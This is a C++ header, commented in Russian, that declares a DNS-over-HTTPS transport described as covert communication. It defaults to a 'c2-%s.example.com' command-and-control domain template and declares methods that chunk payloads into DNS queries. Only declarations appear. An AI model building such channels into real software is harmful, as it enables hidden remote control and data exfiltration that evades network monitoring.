#ifndef MCEAS_COMM_DOH_PROTOCOL_H
#define MCEAS_COMM_DOH_PROTOCOL_H

#include "internal/comm/protocols/protocol_base.h"
#include "internal/comm/connection.h"
#include <map>
#include <string>
#include <queue>

namespace mceas {
namespace comm {

// Конфигурация DoH протокола
struct DoHProtocolConfig : public ProtocolConfig {
    std::string dns_server;      // DNS сервер (например, "1.1.1.1" для Cloudflare)
    std::string domain_template; // Шаблон домена для запросов (например, "c2-%s.example.com")
    int chunk_size;              // Размер чанка данных в DNS запросе
    
    DoHProtocolConfig() : dns_server("1.1.1.1"), domain_template("c2-%s.example.com"), chunk_size(220) {
        // По умолчанию используем HTTPS для DoH
        use_encryption = true;
    }
};

// Протокол DNS over HTTPS для скрытной коммуникации
class DoHProtocol : public IProtocol {
public:
    DoHProtocol();
    ~DoHProtocol() noexcept override;
    
    // Реализация методов интерфейса IProtocol
    bool connect(const ProtocolConfig& config) override;
    bool disconnect() override;
    ConnectionState getConnectionState() const override;
    bool send(const Message& message) override;
    std::optional<Message> receive() override;
    std::optional<Message> sendAndWaitForResponse(const Message& message, int timeout_ms) override;
    
private:
    // Методы для работы с DNS запросами
    std::string encodePayloadForDns(const std::vector<uint8_t>& payload);
    std::vector<uint8_t> decodePayloadFromDns(const std::string& encoded);
    bool sendDnsQuery(const std::string& query_domain, std::string& response);
    
    // Обработка больших сообщений, разбитых на части
    bool sendChunkedMessage(const std::vector<uint8_t>& data);
    std::optional<std::vector<uint8_t>> receiveChunkedMessage();
    
    // Конфигурация
    DoHProtocolConfig config_;
    
    // Состояние соединения
    ConnectionState state_;
    
    // Очередь полученных сообщений
    std::queue<Message> received_messages_;
    
    // Буфер для сборки фрагментированных сообщений
    struct MessageFragment {
        std::string id;
        int total_chunks;
        int current_chunk;
        std::vector<uint8_t> data;
    };
    std::map<std::string, MessageFragment> fragments_;
    
    // Мьютекс для потокобезопасности
    mutable std::mutex mutex_;
};

} // namespace comm
} // namespace mceas

#endif // MCEAS_COMM_DOH_PROTOCOL_H